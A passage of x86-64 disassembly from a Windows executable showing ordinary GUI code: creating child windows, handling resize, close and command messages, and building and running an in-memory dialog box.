   140001eaf:	41 b9 84 08 30 50    	mov    $0x50300884,%r9d
   140001eb5:	48 8b 07             	mov    (%rdi),%rax
   140001eb8:	45 33 c0             	xor    %r8d,%r8d
   140001ebb:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001ec0:	b9 00 02 00 00       	mov    $0x200,%ecx
   140001ec5:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001ec9:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001ece:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001ed3:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001eda:	80 
   140001edb:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001ee2:	80 
   140001ee3:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001eea:	80 
   140001eeb:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001ef2:	80 
   140001ef3:	ff 15 bf 94 02 00    	call   *0x294bf(%rip)        # 0x14002b3b8
   140001ef9:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001efe:	4c 8d 05 8b 9c 02 00 	lea    0x29c8b(%rip),%r8        # 0x14002bb90
   140001f05:	48 89 87 38 20 00 00 	mov    %rax,0x2038(%rdi)
   140001f0c:	48 8d 15 8d 9c 02 00 	lea    0x29c8d(%rip),%rdx        # 0x14002bba0
   140001f13:	48 8b 07             	mov    (%rdi),%rax
   140001f16:	41 b9 01 00 00 50    	mov    $0x50000001,%r9d
   140001f1c:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001f21:	33 c9                	xor    %ecx,%ecx
   140001f23:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001f27:	48 c7 44 24 48 01 00 	movq   $0x1,0x48(%rsp)
   140001f2e:	00 00 
   140001f30:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001f35:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001f3c:	80 
   140001f3d:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001f44:	80 
   140001f45:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001f4c:	80 
   140001f4d:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001f54:	80 
   140001f55:	ff 15 5d 94 02 00    	call   *0x2945d(%rip)        # 0x14002b3b8
   140001f5b:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f62:	45 33 c0             	xor    %r8d,%r8d
   140001f65:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001f69:	ba 80 00 00 00       	mov    $0x80,%edx
   140001f6e:	48 89 87 40 20 00 00 	mov    %rax,0x2040(%rdi)
   140001f75:	ff 15 15 95 02 00    	call   *0x29515(%rip)        # 0x14002b490
   140001f7b:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f82:	ba 80 00 00 00       	mov    $0x80,%edx
   140001f87:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001f8b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001f91:	ff 15 f9 94 02 00    	call   *0x294f9(%rip)        # 0x14002b490
   140001f97:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f9e:	48 8b 8f 28 20 00 00 	mov    0x2028(%rdi),%rcx
   140001fa5:	ba 72 01 00 00       	mov    $0x172,%edx
   140001faa:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001fb0:	ff 15 da 94 02 00    	call   *0x294da(%rip)        # 0x14002b490
   140001fb6:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001fbd:	4d 85 c0             	test   %r8,%r8
   140001fc0:	74 72                	je     0x140002034
   140001fc2:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001fc6:	ba 30 00 00 00       	mov    $0x30,%edx
   140001fcb:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001fd1:	ff 15 b9 94 02 00    	call   *0x294b9(%rip)        # 0x14002b490
   140001fd7:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001fde:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001fe4:	48 8b 8f 30 20 00 00 	mov    0x2030(%rdi),%rcx
   140001feb:	ba 30 00 00 00       	mov    $0x30,%edx
   140001ff0:	ff 15 9a 94 02 00    	call   *0x2949a(%rip)        # 0x14002b490
   140001ff6:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001ffd:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002003:	48 8b 8f 38 20 00 00 	mov    0x2038(%rdi),%rcx
   14000200a:	ba 30 00 00 00       	mov    $0x30,%edx
   14000200f:	ff 15 7b 94 02 00    	call   *0x2947b(%rip)        # 0x14002b490
   140002015:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   14000201c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002022:	48 8b 8f 40 20 00 00 	mov    0x2040(%rdi),%rcx
   140002029:	ba 30 00 00 00       	mov    $0x30,%edx
   14000202e:	ff 15 5c 94 02 00    	call   *0x2945c(%rip)        # 0x14002b490
   140002034:	48 8b 8f 30 20 00 00 	mov    0x2030(%rdi),%rcx
   14000203b:	4c 8d 4f 28          	lea    0x28(%rdi),%r9
   14000203f:	45 33 c0             	xor    %r8d,%r8d
   140002042:	ba 0c 00 00 00       	mov    $0xc,%edx
   140002047:	ff 15 43 94 02 00    	call   *0x29443(%rip)        # 0x14002b490
   14000204d:	4c 8b 4f 20          	mov    0x20(%rdi),%r9
   140002051:	45 33 c0             	xor    %r8d,%r8d
   140002054:	48 8b 8f 38 20 00 00 	mov    0x2038(%rdi),%rcx
   14000205b:	ba 0c 00 00 00       	mov    $0xc,%edx
   140002060:	ff 15 2a 94 02 00    	call   *0x2942a(%rip)        # 0x14002b490
   140002066:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000206a:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000206f:	ff 15 d3 93 02 00    	call   *0x293d3(%rip)        # 0x14002b448
   140002075:	85 c0                	test   %eax,%eax
   140002077:	74 1e                	je     0x140002097
   140002079:	44 0f b7 44 24 6c    	movzwl 0x6c(%rsp),%r8d
   14000207f:	48 8b cf             	mov    %rdi,%rcx
   140002082:	0f b7 54 24 68       	movzwl 0x68(%rsp),%edx
   140002087:	66 44 2b 44 24 64    	sub    0x64(%rsp),%r8w
   14000208d:	66 2b 54 24 60       	sub    0x60(%rsp),%dx
   140002092:	e8 e9 00 00 00       	call   0x140002180
   140002097:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   14000209e:	00 
   14000209f:	48 33 cc             	xor    %rsp,%rcx
   1400020a2:	e8 a9 a4 00 00       	call   0x14000c550
   1400020a7:	4c 8d 9c 24 80 02 00 	lea    0x280(%rsp),%r11
   1400020ae:	00 
   1400020af:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400020b3:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   1400020b7:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400020bb:	49 8b e3             	mov    %r11,%rsp
   1400020be:	5f                   	pop    %rdi
   1400020bf:	c3                   	ret
   1400020c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400020c5:	57                   	push   %rdi
   1400020c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400020ca:	49 8b f9             	mov    %r9,%rdi
   1400020cd:	48 8b d9             	mov    %rcx,%rbx
   1400020d0:	83 ea 05             	sub    $0x5,%edx
   1400020d3:	74 66                	je     0x14000213b
   1400020d5:	83 ea 0b             	sub    $0xb,%edx
   1400020d8:	74 5a                	je     0x140002134
   1400020da:	81 ea 00 01 00 00    	sub    $0x100,%edx
   1400020e0:	74 28                	je     0x14000210a
   1400020e2:	83 fa 01             	cmp    $0x1,%edx
   1400020e5:	75 7f                	jne    0x140002166
   1400020e7:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   1400020eb:	66 3b c2             	cmp    %dx,%ax
   1400020ee:	77 0a                	ja     0x1400020fa
   1400020f0:	41 0f b7 d0          	movzwl %r8w,%edx
   1400020f4:	ff 15 7e 93 02 00    	call   *0x2937e(%rip)        # 0x14002b478
   1400020fa:	b8 01 00 00 00       	mov    $0x1,%eax
   1400020ff:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002104:	48 83 c4 20          	add    $0x20,%rsp
   140002108:	5f                   	pop    %rdi
   140002109:	c3                   	ret
   14000210a:	4c 8b c7             	mov    %rdi,%r8
   14000210d:	49 89 59 08          	mov    %rbx,0x8(%r9)
   140002111:	ba 10 00 00 00       	mov    $0x10,%edx
   140002116:	ff 15 1c 93 02 00    	call   *0x2931c(%rip)        # 0x14002b438
   14000211c:	48 8b cf             	mov    %rdi,%rcx
   14000211f:	e8 bc fb ff ff       	call   0x140001ce0
   140002124:	b8 01 00 00 00       	mov    $0x1,%eax
   140002129:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000212e:	48 83 c4 20          	add    $0x20,%rsp
   140002132:	5f                   	pop    %rdi
   140002133:	c3                   	ret
   140002134:	ba 02 00 00 00       	mov    $0x2,%edx
   140002139:	eb b9                	jmp    0x1400020f4
   14000213b:	ba 10 00 00 00       	mov    $0x10,%edx
   140002140:	ff 15 fa 92 02 00    	call   *0x292fa(%rip)        # 0x14002b440
   140002146:	4c 8b c7             	mov    %rdi,%r8
   140002149:	0f b7 d7             	movzwl %di,%edx
   14000214c:	49 c1 e8 10          	shr    $0x10,%r8
   140002150:	48 8b c8             	mov    %rax,%rcx
   140002153:	e8 28 00 00 00       	call   0x140002180
   140002158:	45 33 c0             	xor    %r8d,%r8d
   14000215b:	33 d2                	xor    %edx,%edx
   14000215d:	48 8b cb             	mov    %rbx,%rcx
   140002160:	ff 15 ea 92 02 00    	call   *0x292ea(%rip)        # 0x14002b450
   140002166:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000216b:	33 c0                	xor    %eax,%eax
   14000216d:	48 83 c4 20          	add    $0x20,%rsp
   140002171:	5f                   	pop    %rdi
   140002172:	c3                   	ret
   140002173:	cc                   	int3
   140002174:	cc                   	int3
   140002175:	cc                   	int3
   140002176:	cc                   	int3
   140002177:	cc                   	int3
   140002178:	cc                   	int3
   140002179:	cc                   	int3
   14000217a:	cc                   	int3
   14000217b:	cc                   	int3
   14000217c:	cc                   	int3
   14000217d:	cc                   	int3
   14000217e:	cc                   	int3
   14000217f:	cc                   	int3
   140002180:	40 53                	rex push %rbx
   140002182:	55                   	push   %rbp
   140002183:	56                   	push   %rsi
   140002184:	57                   	push   %rdi
   140002185:	41 56                	push   %r14
   140002187:	48 83 ec 50          	sub    $0x50,%rsp
   14000218b:	48 8b 05 ae be 03 00 	mov    0x3beae(%rip),%rax        # 0x14003e040
   140002192:	48 33 c4             	xor    %rsp,%rax
   140002195:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000219a:	48 8b f1             	mov    %rcx,%rsi
   14000219d:	0f b7 ea             	movzwl %dx,%ebp
   1400021a0:	48 8b 89 30 20 00 00 	mov    0x2030(%rcx),%rcx
   1400021a7:	45 0f b7 f0          	movzwl %r8w,%r14d
   1400021ab:	ff 15 af 92 02 00    	call   *0x292af(%rip)        # 0x14002b460
   1400021b1:	48 8b d8             	mov    %rax,%rbx
   1400021b4:	48 85 c0             	test   %rax,%rax
   1400021b7:	0f 84 90 00 00 00    	je     0x14000224d
   1400021bd:	0f b7 8e 58 20 00 00 	movzwl 0x2058(%rsi),%ecx
   1400021c4:	33 ff                	xor    %edi,%edi
   1400021c6:	0f b7 86 5e 20 00 00 	movzwl 0x205e(%rsi),%eax
   1400021cd:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400021d2:	89 7c 24 3c          	mov    %edi,0x3c(%rsp)
   1400021d6:	8d 14 49             	lea    (%rcx,%rcx,2),%edx
   1400021d9:	8b cd                	mov    %ebp,%ecx
   1400021db:	2b ca                	sub    %edx,%ecx
   1400021dd:	48 8b 96 48 20 00 00 	mov    0x2048(%rsi),%rdx
   1400021e4:	2b c8                	sub    %eax,%ecx
   1400021e6:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   1400021ea:	48 85 d2             	test   %rdx,%rdx
   1400021ed:	74 0c                	je     0x1400021fb
   1400021ef:	48 8b cb             	mov    %rbx,%rcx
   1400021f2:	ff 15 40 8e 02 00    	call   *0x28e40(%rip)        # 0x14002b038
   1400021f8:	48 8b f8             	mov    %rax,%rdi
   1400021fb:	48 8d 56 28          	lea    0x28(%rsi),%rdx
   1400021ff:	c7 44 24 20 50 25 00 	movl   $0x2550,0x20(%rsp)
   140002206:	00 
   140002207:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000220c:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140002212:	48 8b cb             	mov    %rbx,%rcx
   140002215:	ff 15 4d 92 02 00    	call   *0x2924d(%rip)        # 0x14002b468
   14000221b:	48 83 be 48 20 00 00 	cmpq   $0x0,0x2048(%rsi)
   140002222:	00 
   140002223:	74 0c                	je     0x140002231
   140002225:	48 8b d7             	mov    %rdi,%rdx
   140002228:	48 8b cb             	mov    %rbx,%rcx
   14000222b:	ff 15 07 8e 02 00    	call   *0x28e07(%rip)        # 0x14002b038
   140002231:	48 8b 8e 30 20 00 00 	mov    0x2030(%rsi),%rcx
   140002238:	48 8b d3             	mov    %rbx,%rdx
   14000223b:	ff 15 17 92 02 00    	call   *0x29217(%rip)        # 0x14002b458
   140002241:	0f b7 54 24 3c       	movzwl 0x3c(%rsp),%edx
   140002246:	66 2b 54 24 34       	sub    0x34(%rsp),%dx
   14000224b:	eb 05                	jmp    0x140002252
   14000224d:	ba 14 00 00 00       	mov    $0x14,%edx
   140002252:	0f b7 8e 60 20 00 00 	movzwl 0x2060(%rsi),%ecx
   140002259:	44 0f b7 8e 5e 20 00 	movzwl 0x205e(%rsi),%r9d
   140002260:	00 
   140002261:	66 3b d1             	cmp    %cx,%dx
   140002264:	0f b7 c1             	movzwl %cx,%eax
   140002267:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   14000226e:	00 
   14000226f:	66 0f 43 c2          	cmovae %dx,%ax
   140002273:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140002277:	0f b7 96 58 20 00 00 	movzwl 0x2058(%rsi),%edx
   14000227e:	48 8b 8e 28 20 00 00 	mov    0x2028(%rsi),%rcx
   140002285:	44 8b c2             	mov    %edx,%r8d
   140002288:	0f b7 d8             	movzwl %ax,%ebx
   14000228b:	ff 15 f7 91 02 00    	call   *0x291f7(%rip)        # 0x14002b488
   140002291:	0f b7 be 58 20 00 00 	movzwl 0x2058(%rsi),%edi
   140002298:	0f b7 c5             	movzwl %bp,%eax
   14000229b:	0f b7 cf             	movzwl %di,%ecx
   14000229e:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400022a5:	00 
   1400022a6:	66 03 c9             	add    %cx,%cx
   1400022a9:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400022ad:	66 03 8e 5e 20 00 00 	add    0x205e(%rsi),%cx
   1400022b4:	66 2b c7             	sub    %di,%ax
   1400022b7:	66 2b c1             	sub    %cx,%ax
   1400022ba:	0f b7 d1             	movzwl %cx,%edx
   1400022bd:	48 8b 8e 30 20 00 00 	mov    0x2030(%rsi),%rcx
   1400022c4:	44 8b c7             	mov    %edi,%r8d
   1400022c7:	44 0f b7 c8          	movzwl %ax,%r9d
   1400022cb:	ff 15 b7 91 02 00    	call   *0x291b7(%rip)        # 0x14002b488
   1400022d1:	0f b7 96 58 20 00 00 	movzwl 0x2058(%rsi),%edx
   1400022d8:	41 0f b7 ce          	movzwl %r14w,%ecx
   1400022dc:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400022e3:	00 
   1400022e4:	8d 04 13             	lea    (%rbx,%rdx,1),%eax
   1400022e7:	66 03 f8             	add    %ax,%di
   1400022ea:	0f b7 c2             	movzwl %dx,%eax
   1400022ed:	66 03 c0             	add    %ax,%ax
   1400022f0:	44 0f b7 c7          	movzwl %di,%r8d
   1400022f4:	66 2b c8             	sub    %ax,%cx
   1400022f7:	0f b7 c5             	movzwl %bp,%eax
   1400022fa:	66 2b 8e 5c 20 00 00 	sub    0x205c(%rsi),%cx
   140002301:	66 2b c2             	sub    %dx,%ax
   140002304:	66 2b cf             	sub    %di,%cx
   140002307:	66 2b c2             	sub    %dx,%ax
   14000230a:	44 0f b7 d1          	movzwl %cx,%r10d
   14000230e:	48 8b 8e 38 20 00 00 	mov    0x2038(%rsi),%rcx
   140002315:	44 0f b7 c8          	movzwl %ax,%r9d
   140002319:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   14000231e:	ff 15 64 91 02 00    	call   *0x29164(%rip)        # 0x14002b488
   140002324:	0f b7 96 5a 20 00 00 	movzwl 0x205a(%rsi),%edx
   14000232b:	0f b7 86 58 20 00 00 	movzwl 0x2058(%rsi),%eax
   140002332:	44 8b ca             	mov    %edx,%r9d
   140002335:	44 0f b7 96 5c 20 00 	movzwl 0x205c(%rsi),%r10d
   14000233c:	00 
   14000233d:	66 44 2b f0          	sub    %ax,%r14w
   140002341:	48 8b 8e 40 20 00 00 	mov    0x2040(%rsi),%rcx
   140002348:	66 2b e8             	sub    %ax,%bp
   14000234b:	66 45 2b f2          	sub    %r10w,%r14w
   14000234f:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140002356:	00 
   140002357:	66 2b ea             	sub    %dx,%bp
   14000235a:	45 0f b7 c6          	movzwl %r14w,%r8d
   14000235e:	0f b7 d5             	movzwl %bp,%edx
   140002361:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   140002366:	ff 15 1c 91 02 00    	call   *0x2911c(%rip)        # 0x14002b488
   14000236c:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002371:	48 33 cc             	xor    %rsp,%rcx
   140002374:	e8 d7 a1 00 00       	call   0x14000c550
   140002379:	48 83 c4 50          	add    $0x50,%rsp
   14000237d:	41 5e                	pop    %r14
   14000237f:	5f                   	pop    %rdi
   140002380:	5e                   	pop    %rsi
   140002381:	5d                   	pop    %rbp
   140002382:	5b                   	pop    %rbx
   140002383:	c3                   	ret
   140002384:	cc                   	int3
   140002385:	cc                   	int3
   140002386:	cc                   	int3
   140002387:	cc                   	int3
   140002388:	cc                   	int3
   140002389:	cc                   	int3
   14000238a:	cc                   	int3
   14000238b:	cc                   	int3
   14000238c:	cc                   	int3
   14000238d:	cc                   	int3
   14000238e:	cc                   	int3
   14000238f:	cc                   	int3
   140002390:	40 55                	rex push %rbp
   140002392:	53                   	push   %rbx
   140002393:	56                   	push   %rsi
   140002394:	57                   	push   %rdi
   140002395:	41 56                	push   %r14
   140002397:	48 8d ac 24 30 df ff 	lea    -0x20d0(%rsp),%rbp
   14000239e:	ff 
   14000239f:	b8 d0 21 00 00       	mov    $0x21d0,%eax
   1400023a4:	e8 a7 a4 00 00       	call   0x14000c850
   1400023a9:	48 2b e0             	sub    %rax,%rsp
   1400023ac:	48 8b 05 8d bc 03 00 	mov    0x3bc8d(%rip),%rax        # 0x14003e040
   1400023b3:	48 33 c4             	xor    %rsp,%rax
   1400023b6:	48 89 85 c0 20 00 00 	mov    %rax,0x20c0(%rbp)
   1400023bd:	48 8b d9             	mov    %rcx,%rbx
   1400023c0:	4d 8b f0             	mov    %r8,%r14
   1400023c3:	33 c9                	xor    %ecx,%ecx
   1400023c5:	48 8b f2             	mov    %rdx,%rsi
   1400023c8:	ff 15 ea 8c 02 00    	call   *0x28cea(%rip)        # 0x14002b0b8
   1400023ce:	33 d2                	xor    %edx,%edx
   1400023d0:	48 8d 8d b6 1f 00 00 	lea    0x1fb6(%rbp),%rcx
   1400023d7:	41 b8 02 01 00 00    	mov    $0x102,%r8d
   1400023dd:	48 8b f8             	mov    %rax,%rdi
   1400023e0:	e8 eb 80 02 00       	call   0x14002a4d0
   1400023e5:	33 c9                	xor    %ecx,%ecx
   1400023e7:	c7 85 a0 1f 00 00 84 	movl   $0x90cc0884,0x1fa0(%rbp)
   1400023ee:	08 cc 90 
   1400023f1:	48 89 8d a4 1f 00 00 	mov    %rcx,0x1fa4(%rbp)
   1400023f8:	4c 8d 05 b1 97 02 00 	lea    0x297b1(%rip),%r8        # 0x14002bbb0
   1400023ff:	66 89 8d b4 1f 00 00 	mov    %cx,0x1fb4(%rbp)
   140002406:	ba 40 00 00 00       	mov    $0x40,%edx
   14000240b:	48 8d 8d b6 1f 00 00 	lea    0x1fb6(%rbp),%rcx
   140002412:	c7 85 ac 1f 00 00 00 	movl   $0xc80000,0x1fac(%rbp)
   140002419:	00 c8 00 
   14000241c:	c7 85 b0 1f 00 00 96 	movl   $0x96,0x1fb0(%rbp)
   140002423:	00 00 00 
   140002426:	e8 95 01 00 00       	call   0x1400025c0
   14000242b:	33 c0                	xor    %eax,%eax
   14000242d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140002432:	33 d2                	xor    %edx,%edx
   140002434:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002439:	41 b8 40 20 00 00    	mov    $0x2040,%r8d
   14000243f:	e8 8c 80 02 00       	call   0x14002a4d0
   140002444:	48 8b cb             	mov    %rbx,%rcx
   140002447:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000244c:	e8 1b 55 01 00       	call   0x14001796c
   140002451:	48 8b ce             	mov    %rsi,%rcx
   140002454:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002459:	e8 0e 55 01 00       	call   0x14001796c
   14000245e:	49 8b ce             	mov    %r14,%rcx
   140002461:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002466:	e8 01 55 01 00       	call   0x14001796c
   14000246b:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002470:	4c 8d 0d 49 fc ff ff 	lea    -0x3b7(%rip),%r9        # 0x1400020c0
   140002477:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000247c:	45 33 c0             	xor    %r8d,%r8d
   14000247f:	48 8d 95 a0 1f 00 00 	lea    0x1fa0(%rbp),%rdx
   140002486:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000248b:	48 8b cf             	mov    %rdi,%rcx
   14000248e:	ff 15 ec 8f 02 00    	call   *0x28fec(%rip)        # 0x14002b480
   140002494:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002499:	48 8b d8             	mov    %rax,%rbx
   14000249c:	e8 8f 2a 01 00       	call   0x140014f30
   1400024a1:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400024a6:	e8 85 2a 01 00       	call   0x140014f30
   1400024ab:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400024b0:	e8 7b 2a 01 00       	call   0x140014f30
   1400024b5:	48 8b 8d 78 1f 00 00 	mov    0x1f78(%rbp),%rcx
   1400024bc:	48 85 c9             	test   %rcx,%rcx
   1400024bf:	74 06                	je     0x1400024c7
   1400024c1:	ff 15 79 8b 02 00    	call   *0x28b79(%rip)        # 0x14002b040
   1400024c7:	48 8b 8d 80 1f 00 00 	mov    0x1f80(%rbp),%rcx
   1400024ce:	48 85 c9             	test   %rcx,%rcx
   1400024d1:	74 06                	je     0x1400024d9
   1400024d3:	ff 15 57 8f 02 00    	call   *0x28f57(%rip)        # 0x14002b430
   1400024d9:	8b c3                	mov    %ebx,%eax
   1400024db:	48 8b 8d c0 20 00 00 	mov    0x20c0(%rbp),%rcx
   1400024e2:	48 33 cc             	xor    %rsp,%rcx
   1400024e5:	e8 66 a0 00 00       	call   0x14000c550
   1400024ea:	48 81 c4 d0 21 00 00 	add    $0x21d0,%rsp
   1400024f1:	41 5e                	pop    %r14
   1400024f3:	5f                   	pop    %rdi
   1400024f4:	5e                   	pop    %rsi
   1400024f5:	5b                   	pop    %rbx
   1400024f6:	5d                   	pop    %rbp
   1400024f7:	c3                   	ret
   1400024f8:	cc                   	int3
   1400024f9:	cc                   	int3
   1400024fa:	cc                   	int3
   1400024fb:	cc                   	int3
   1400024fc:	cc                   	int3
   1400024fd:	cc                   	int3
   1400024fe:	cc                   	int3
   1400024ff:	cc                   	int3
   140002500:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002505:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000250a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000250f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002514:	41 56                	push   %r14
   140002516:	48 83 ec 20          	sub    $0x20,%rsp
   14000251a:	33 ff                	xor    %edi,%edi
   14000251c:	49 8b d8             	mov    %r8,%rbx
   14000251f:	48 8b f2             	mov    %rdx,%rsi
   140002522:	44 8b f7             	mov    %edi,%r14d
   140002525:	8b ef                	mov    %edi,%ebp
   140002527:	48 85 c9             	test   %rcx,%rcx
   14000252a:	74 0d                	je     0x140002539
   14000252c:	45 33 c0             	xor    %r8d,%r8d
   14000252f:	33 d2                	xor    %edx,%edx
   140002531:	e8 5a 6e 00 00       	call   0x140009390
   140002536:	48 8b f8             	mov    %rax,%rdi
   140002539:	48 85 f6             	test   %rsi,%rsi
   14000253c:	74 10                	je     0x14000254e
   14000253e:	45 33 c0             	xor    %r8d,%r8d
   140002541:	33 d2                	xor    %edx,%edx
   140002543:	48 8b ce             	mov    %rsi,%rcx
   140002546:	e8 45 6e 00 00       	call   0x140009390
   14000254b:	4c 8b f0             	mov    %rax,%r14
   14000254e:	48 85 db             	test   %rbx,%rbx
   140002551:	74 10                	je     0x140002563
   140002553:	45 33 c0             	xor    %r8d,%r8d
   140002556:	33 d2                	xor    %edx,%edx
   140002558:	48 8b cb             	mov    %rbx,%rcx
   14000255b:	e8 30 6e 00 00       	call   0x140009390
   140002560:	48 8b e8             	mov    %rax,%rbp
   140002563:	48 85 ed             	test   %rbp,%rbp
   140002566:	4c 8d 05 83 96 02 00 	lea    0x29683(%rip),%r8        # 0x14002bbf0
   14000256d:	49 8b d6             	mov    %r14,%rdx
   140002570:	48 8b cf             	mov    %rdi,%rcx
   140002573:	4c 0f 45 c5          	cmovne %rbp,%r8
   140002577:	e8 14 fe ff ff       	call   0x140002390
   14000257c:	48 8b cf             	mov    %rdi,%rcx
   14000257f:	8b d8                	mov    %eax,%ebx
   140002581:	e8 aa 29 01 00       	call   0x140014f30
   140002586:	49 8b ce             	mov    %r14,%rcx
   140002589:	e8 a2 29 01 00       	call   0x140014f30
   14000258e:	48 8b cd             	mov    %rbp,%rcx
   140002591:	e8 9a 29 01 00       	call   0x140014f30
   140002596:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000259b:	8b c3                	mov    %ebx,%eax
   14000259d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400025a2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025a7:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400025ac:	48 83 c4 20          	add    $0x20,%rsp
   1400025b0:	41 5e                	pop    %r14
   1400025b2:	c3                   	ret
   1400025b3:	cc                   	int3
   1400025b4:	cc                   	int3
   1400025b5:	cc                   	int3
   1400025b6:	cc                   	int3
   1400025b7:	cc                   	int3
   1400025b8:	cc                   	int3
   1400025b9:	cc                   	int3
   1400025ba:	cc                   	int3
   1400025bb:	cc                   	int3
   1400025bc:	cc                   	int3
   1400025bd:	cc                   	int3
   1400025be:	cc                   	int3
   1400025bf:	cc                   	int3
   1400025c0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400025c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400025ca:	53                   	push   %rbx
   1400025cb:	55                   	push   %rbp
   1400025cc:	56                   	push   %rsi
   1400025cd:	57                   	push   %rdi
   1400025ce:	48 83 ec 38          	sub    $0x38,%rsp
   1400025d2:	49 8b f0             	mov    %r8,%rsi
   1400025d5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400025da:	48 8b da             	mov    %rdx,%rbx
   1400025dd:	48 8b f9             	mov    %rcx,%rdi
   1400025e0:	e8 5b ea ff ff       	call   0x140001040
   1400025e5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400025ea:	4c 8b ce             	mov    %rsi,%r9
   1400025ed:	4c 8b c3             	mov    %rbx,%r8
   1400025f0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400025f7:	00 00 
   1400025f9:	48 8b d7             	mov    %rdi,%rdx
   1400025fc:	48 8b 08             	mov    (%rax),%rcx
   1400025ff:	e8 d4 25 01 00       	call   0x140014bd8
   140002604:	85 c0                	test   %eax,%eax
   140002606:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000260b:	0f 48 c1             	cmovs  %ecx,%eax
   14000260e:	48 83 c4 38          	add    $0x38,%rsp
   140002612:	5f                   	pop    %rdi
   140002613:	5e                   	pop    %rsi
   140002614:	5d                   	pop    %rbp
   140002615:	5b                   	pop    %rbx
   140002616:	c3                   	ret
   140002617:	cc                   	int3
   140002618:	cc                   	int3
   140002619:	cc                   	int3
   14000261a:	cc                   	int3
   14000261b:	cc                   	int3
   14000261c:	cc                   	int3
   14000261d:	cc                   	int3
   14000261e:	cc                   	int3
   14000261f:	cc                   	int3
   140002620:	40 53                	rex push %rbx
   140002622:	55                   	push   %rbp
   140002623:	56                   	push   %rsi
   140002624:	57                   	push   %rdi
   140002625:	b8 38 20 00 00       	mov    $0x2038,%eax
